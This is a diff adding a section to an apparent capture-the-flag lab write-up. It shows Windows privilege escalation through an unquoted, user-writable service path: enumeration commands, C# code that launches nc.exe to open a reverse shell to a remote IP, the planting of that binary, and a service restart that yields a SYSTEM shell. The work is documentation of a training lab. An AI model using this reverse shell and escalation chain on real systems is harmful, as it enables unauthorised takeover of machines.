@@ -360,3 +360,64 @@ C:\xampp\htdocs\resources\uploads>whoami
 whoami
 wreath-pc\thomas
 ```
+- By using the command below, I found an unquoted path running as the system with full write access.
+```powershell
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+
+System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto
+
+
+sc qc  SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
+Owner  : BUILTIN\Administrators
+Group  : WREATH-PC\None
+Access : BUILTIN\Users Allow  FullControl
+```
+- Next, I made a `.c` file with the contents below and compile it using `mcs`
+```powershell
+using System;
+using System.Diagnostics;
+namespace exploit{
+    class Program{
+        static void Main(){
+        	Process proc = new Process();
+		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "10.50.76.115 9999 -e cmd.exe");
+		procInfo.CreateNoWindow = true;
+		proc.StartInfo = procInfo;
+		proc.Start();
+	}
+    }
+}
+```
+- Compile the file using `mcs`
+```bash
+mcs exploit.cs
+```
+- we got our Windows executable.
+- I uploaded the Windows executable into `C:\Program Files (x86)\System Explorer\System.exe` and run the commands below with Netcat listening on our local machine.
+```bash
+sc stop SystemExplorerHelpService
+
+sc start SystemExplorerHelpService
+
+
+└─$ rlwrap nc -nvlp 9999
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
